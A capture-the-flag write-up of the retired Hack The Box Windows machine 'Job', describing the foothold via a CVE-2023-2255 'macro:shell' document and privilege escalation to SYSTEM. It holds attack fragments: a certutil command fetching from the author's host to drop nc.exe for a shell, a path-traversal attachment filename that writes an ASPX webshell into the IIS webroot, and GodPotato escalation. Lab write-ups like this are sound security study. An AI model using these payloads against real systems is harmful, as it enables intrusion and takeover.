# JOB — Hack The Box, Medium, Windows

**TL;DR:** A recruitment-mail box. SMTP accepts an unauthenticated CV to
`career@job.local`; a poller opens it, so **CVE-2023-2255** (`macro:shell` in an
`office:load-finished` listener — no macro prompt, survives "macros disabled")
runs a command. PowerShell is AppLocker-blocked, so a `certutil`+`nc` LOLBin
chain from `C:\Windows\Tasks` lands a shell. A world-readable `hMailServer.ini`
MD5 cracks to a mail admin; the SYSTEM-run `PHISH` event handler builds a save
path from the **attacker-controlled attachment filename**, so a traversal name
writes an ASPX webshell into the IIS webroot → `DefaultAppPool` (SeImpersonate)
→ GodPotato → SYSTEM.

*Machine status: retired. Flag values are redacted here; the local copy keeps
them as evidence.*

A standalone Windows Server 2022 built around a recruitment mail workflow. Every
control you expect is present and working — and the box falls entirely through the
one thing it is *designed* to do: open documents that strangers email in.

## Recon

Five ports: `25` hMailServer SMTP, `80` IIS, `445` SMB, `5985` WinRM. No 88/389 —
standalone, not a DC. The website is a static template with one loud instruction:
*"send your CV as a LibreOffice document to `career@job.local` — we switched to
open-source products."* SMTP happily accepts unauthenticated mail for `career`
(`RCPT TO` → 250). A machine that hands you both the delivery channel and the file
format it will open is telling you where to look.

## Foothold — CVE-2023-2255, the hard way

First instinct: an ODT with a Basic macro bound to document-load. Confirmed the
poller *does* open documents (an external-image reference in the ODT is
auto-fetched the moment it opens) and that egress to us works — but the Basic
macro never fires. Macros are disabled.

The right lever is **CVE-2023-2255**: LibreOffice honoured a `macro:` URI in an
`office:load-finished` event listener that dispatches a *built-in* function
(`Shell`) with **no macro-security prompt**. That is a different mechanism from a
document macro, and it survives "macros disabled".

Two diagnostic sends made the difference rather than guessing:

- ODT with `macro:shell(powershell …)` **plus** an external-image beacon → the
  beacon was fetched (doc opened) but PowerShell never called home. So the
  dispatch might be firing but PowerShell was the problem.
- Swap the payload to `macro:shell(cmd /c certutil … http://us/CERTFIRED …)` →
  `/CERTFIRED` was fetched. The dispatch fires; `powershell.exe` is
  **AppLocker-blocked**; native LOLBins run.

So: `macro:shell` chaining `certutil` to drop `nc.exe` into `C:\Windows\Tasks`
(a directory the default AppLocker rules still allow you to execute from) and run
it. Shell as `job\jack.black`. `user.txt` done.

*Methodology note:* skipping the CVE/PoC hunt and hand-rolling the Basic-macro
idea burned the early hours. Pinning the product and reading the PoC for the
*mechanism* (which XML event, which URI scheme) is what turned it. And when the
first payload silently failed, the fix was a **direction test** (certutil vs
powershell), not more payload tweaking.

## Privesc — a password on disk, and an event that runs as SYSTEM

`hMailServer.ini` (world-readable) gives the admin password as unsalted MD5. Plain
rockyou and best64 missed it — but only because a stale `hashcat` job from an
earlier session was holding the instance lock and silently no-op'ing every crack I
launched. Killed it; `rockyou-30000` rules cracked it → `job.mail`. (Lesson: a
cracker that returns instantly with nothing "recovered" may not have run at all —
check for `Already an instance running`.)

`job.mail` authenticates to the hMailServer COM API but is **not** the Windows
Administrator password, and there are no other mail accounts. The service runs as
LocalSystem, so its scripts run as SYSTEM — but the `Events` folder isn't writable
by us, `cscript` works while the COM `Reload`/`Scripting.Save` methods don't
(Err 438), and jack.black can't restart the service. A dead end for *replacing*
the script.

The script that's already there is the whole point. `EventHandlers.vbs` contains:

```vbscript
Sub PHISH(oMessage)
  oMessage.attachments.item(0).saveas("C:\programdata\attachments\" & _
     oMessage.attachments.item(0).filename)
End Sub
```

It runs as SYSTEM on incoming mail and builds the save path from the
**attacker-controlled attachment filename**. Send an attachment named
`..\..\inetpub\wwwroot\s.aspx` and SYSTEM writes your ASPX webshell straight into
the IIS webroot. (Confirmed the primitive first with a plain marker filename, then
a probe, before weaponising.)

The webshell executes as `IIS APPPOOL\DefaultAppPool`, which — as usual — holds
`SeImpersonatePrivilege`. GodPotato from `C:\Windows\Tasks` turns that into
`NT AUTHORITY\SYSTEM`. `root.txt` done.

## Why the box is well-built

Every obvious shortcut is closed: document macros off, PowerShell blocked, SMB
self-relay reflected, admin password absent from rockyou's easy tiers, the mail
DB encrypted at rest. The path only opens if you (a) find the *right* LibreOffice
primitive rather than the familiar one, (b) notice the crack tooling wasn't
actually running, and (c) read the one active line in a script full of commented
stubs and realise it's a SYSTEM-level arbitrary write keyed on a field you
control.

## Chain in one line
CVE-2023-2255 `macro:shell` (AppLocker-safe certutil+nc) → jack.black →
hMailServer admin MD5 → `PHISH` SYSTEM attachment-write path traversal → ASPX in
webroot → DefaultAppPool (SeImpersonate) → GodPotato → SYSTEM.
